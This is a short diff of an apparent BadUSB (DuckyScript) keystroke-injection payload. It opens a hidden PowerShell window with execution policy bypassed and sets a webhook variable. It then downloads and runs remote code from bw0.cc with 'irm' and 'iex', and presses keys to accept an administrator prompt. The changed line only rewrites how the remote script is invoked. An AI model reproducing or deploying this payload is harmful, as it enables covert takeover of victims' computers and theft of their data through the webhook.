@@ -9,7 +9,7 @@ DEFAULT_DELAY 100
 REM open powershell (remove -W Hidden to show the window).
 GUI r
 DELAY 750
-STRING powershell -W H -Ep Bypass -C $dc = 'YOUR_WEBHOOK_HERE'; irm https://bw0.cc/gbps | iex
+STRING powershell -W H -Ep Bypass -C $dc = 'YOUR_WEBHOOK_HERE'; iex (irm bw0.cc/gbps)
 CTRL-SHIFT ENTER
 DELAY 2500
 ALT y
